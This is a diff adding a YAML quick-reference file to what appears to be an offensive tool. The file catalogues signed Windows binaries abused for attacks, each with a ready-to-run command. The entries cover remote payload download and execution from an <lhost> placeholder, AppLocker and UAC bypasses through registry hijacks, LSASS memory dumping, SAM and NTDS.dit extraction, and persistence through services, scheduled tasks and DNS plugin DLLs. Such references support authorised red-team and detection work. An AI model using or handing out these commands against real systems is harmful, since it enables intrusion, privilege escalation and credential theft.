@@ -1,0 +1,161 @@
+# Yhwach — LOLBAS quick reference: signed Windows binaries abused to execute,
+# download, dump creds, or bypass AWL/UAC. The Windows analogue of gtfobins.
+# `yhwach ref lolbas [--query certutil]` (or -q credentials / awl / download).
+# Source: lolbas-project.github.io (canonical commands, generic placeholders).
+# fodhelper/sdclt are carried as own-knowledge (UACME #33/#53), NOT sourced to LOLBAS.
+# Each entry: bin, category, function (one line), ref (a canonical command), mitre.
+
+# ---- Execute / AWL (AppLocker) bypass -------------------------------------
+- bin: regsvr32
+  category: awl-bypass
+  function: "run a remote .sct scriptlet (Squiblydoo) — AppLocker/allowlist bypass"
+  ref: "regsvr32 /s /n /u /i:http://<lhost>/x.sct scrobj.dll"
+  mitre: T1218.010
+- bin: rundll32
+  category: execute
+  function: "execute a DLL export or JS via a signed binary"
+  ref: "rundll32 <payload>.dll,EntryPoint"
+  mitre: T1218.011
+- bin: mshta
+  category: execute
+  function: "run inline/remote HTA (VBScript/JScript) — allowlist bypass"
+  ref: "mshta http://<lhost>/x.hta"
+  mitre: T1218.005
+- bin: msbuild
+  category: awl-bypass
+  function: "compile+run an inline C# task from a .csproj/.xml — AWL bypass"
+  ref: "msbuild <inline_task>.xml"
+  mitre: T1127.001
+- bin: installutil
+  category: awl-bypass
+  function: "run the uninstall method of a .NET assembly — AWL bypass"
+  ref: "installutil /logfile= /LogToConsole=false /U <asm>.dll"
+  mitre: T1218.004
+- bin: msiexec
+  category: execute
+  function: "install a local/remote MSI (pairs with AlwaysInstallElevated)"
+  ref: "msiexec /q /i http://<lhost>/x.msi"
+  mitre: T1218.007
+- bin: cmstp
+  category: uac-bypass
+  function: "run an INF SCT command — UAC bypass / AWL bypass"
+  ref: "cmstp /s /ns <inf>"
+  mitre: T1218.003
+- bin: odbcconf
+  category: awl-bypass
+  function: "register+run a DLL via REGSVR action — AWL bypass"
+  ref: "odbcconf /a {REGSVR <payload>.dll}"
+  mitre: T1218.008
+- bin: wmic
+  category: execute
+  function: "spawn a process locally or on a remote host"
+  ref: "wmic process call create <cmd>"
+  mitre: T1047
+- bin: forfiles
+  category: execute
+  function: "run a command through a signed binary (parent-process spoof)"
+  ref: "forfiles /p c:\\windows\\system32 /m notepad.exe /c <cmd>"
+  mitre: T1059
+
+# ---- UAC bypass (own-knowledge, not LOLBAS) --------------------------------
+- bin: fodhelper
+  category: uac-bypass
+  function: "auto-elevating binary hijacked via HKCU ms-settings shell — UAC bypass"
+  ref: "set HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command; run fodhelper"
+  mitre: T1548.002
+  note: "own-knowledge (UACME #33) — not sourced to LOLBAS"
+- bin: eventvwr
+  category: uac-bypass
+  function: "auto-elevating MMC hijacked via HKCU mscfile shell — UAC bypass"
+  ref: "set HKCU\\Software\\Classes\\mscfile\\shell\\open\\command; run eventvwr"
+  mitre: T1548.002
+
+# ---- Download / transfer ---------------------------------------------------
+- bin: certutil
+  category: download
+  function: "download a file, or decode a base64/hex blob, via a signed binary"
+  ref: "certutil -urlcache -split -f http://<lhost>/x x"
+  mitre: T1105
+- bin: bitsadmin
+  category: download
+  function: "queue a BITS transfer to fetch a payload"
+  ref: "bitsadmin /transfer j http://<lhost>/x c:\\x"
+  mitre: T1197
+- bin: esentutl
+  category: download
+  function: "copy a file from a UNC/remote path via a signed binary"
+  ref: "esentutl /y \\\\<lhost>\\s\\x /d c:\\x"
+  mitre: T1105
+- bin: expand
+  category: copy
+  function: "copy/expand a file from a UNC path (allowlist-friendly)"
+  ref: "expand \\\\<lhost>\\s\\x c:\\x"
+  mitre: T1105
+
+# ---- Credential access -----------------------------------------------------
+- bin: comsvcs.dll
+  category: credentials
+  function: "MiniDump LSASS via the signed MiniDump export (no mimikatz binary)"
+  ref: "rundll32 comsvcs.dll, MiniDump <lsass_pid> c:\\l.dmp full"
+  mitre: T1003.001
+- bin: reg
+  category: credentials
+  function: "save the SAM/SYSTEM/SECURITY hives for offline secretsdump"
+  ref: "reg save HKLM\\SAM sam & reg save HKLM\\SYSTEM sys"
+  mitre: T1003.002
+- bin: ntdsutil
+  category: credentials
+  function: "create an NTDS.dit IFM snapshot on a DC"
+  ref: "ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\i\" q q"
+  mitre: T1003.003
+- bin: vssadmin
+  category: credentials
+  function: "shadow-copy the volume to read a locked NTDS.dit / hive"
+  ref: "vssadmin create shadow /for=C:"
+  mitre: T1003.003
+- bin: findstr
+  category: credentials
+  function: "grep files/SYSVOL for GPP cpassword / passwords"
+  ref: "findstr /si cpassword \\\\<domain>\\sysvol\\*.xml"
+  mitre: T1552.001
+
+# ---- Persistence -----------------------------------------------------------
+- bin: schtasks
+  category: persistence
+  function: "create a scheduled task for execution/persistence"
+  ref: "schtasks /create /tn u /tr <cmd> /sc onlogon"
+  mitre: T1053.005
+- bin: sc
+  category: persistence
+  function: "create/modify a Windows service to run a binary"
+  ref: "sc create u binPath= <cmd> start= auto"
+  mitre: T1543.003
+- bin: dnscmd
+  category: persistence
+  function: "load a DLL as a DNS server plugin (DnsAdmins -> SYSTEM on the DC)"
+  ref: "dnscmd <dc> /config /serverlevelplugindll \\\\<lhost>\\s\\x.dll"
+  mitre: T1543.003
+
+# ---- Recon -----------------------------------------------------------------
+- bin: systeminfo
+  category: recon
+  function: "OS build + hotfixes for kernel-exploit / patch-level triage"
+  ref: "systeminfo"
+  mitre: T1082
+- bin: net
+  category: recon
+  function: "enumerate local/domain users, groups, shares, sessions"
+  ref: "net user /domain & net group \"Domain Admins\" /domain"
+  mitre: T1087
+- bin: tasklist
+  category: recon
+  function: "list processes (find LSASS pid, EDR, session tokens)"
+  ref: "tasklist /v"
+  mitre: T1057
+
+# ---- ADS / staging ---------------------------------------------------------
+- bin: makecab
+  category: ads
+  function: "pack a payload into a .cab / alternate data stream for staging"
+  ref: "makecab payload.exe payload.cab"
+  mitre: T1564.004
